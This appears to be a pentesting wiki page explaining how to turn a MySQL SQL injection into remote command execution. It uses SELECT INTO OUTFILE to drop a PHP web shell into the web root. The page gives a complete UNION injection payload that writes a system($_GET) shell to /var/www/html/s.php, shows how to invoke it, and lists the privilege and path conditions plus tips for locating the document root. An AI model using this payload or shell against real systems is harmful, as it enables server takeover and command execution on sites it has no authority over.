---
title: "Writing a web shell with MySQL INTO OUTFILE"
description: "Using SELECT INTO OUTFILE from a MySQL injection to drop a web shell in the document root, and the FILE privilege, secure_file_priv, and path conditions required."
keywords:
  - INTO OUTFILE
  - web shell
  - MySQL file write
  - secure_file_priv
  - document root
---

# INTO OUTFILE

`SELECT ... INTO OUTFILE '/path/file'` writes the selected rows to a file on the database host. Writing a small PHP (or other server-side) script into a directory the web server executes turns SQL write access into command execution over HTTP.

In a union injection, select the shell source into the position and append the `INTO OUTFILE`:

```sql
' UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/s.php'-- 
```

Requesting `/s.php?c=id` then runs commands as the web server user. Several conditions must line up:

- `FILE` privilege and a `secure_file_priv` that allows the target directory (empty value) or is that directory.
- The MySQL process user can write to the path, and the path is inside the web root, so you must know or guess the document root (read it from a config file with `LOAD_FILE` first).
- The file must not already exist. `INTO OUTFILE` refuses to overwrite.

`INTO OUTFILE` applies row and column formatting (line terminators, escaping), which is fine for a text script but corrupts exact binary content. For raw bytes use `INTO DUMPFILE` instead. If the exact web root is unknown, writing to several common candidates or reading the server config first is usually quicker than guessing blindly.

## References

- MySQL Reference Manual: SELECT INTO OUTFILE, `secure_file_priv`
- OWASP Testing Guide: Testing for SQL Injection
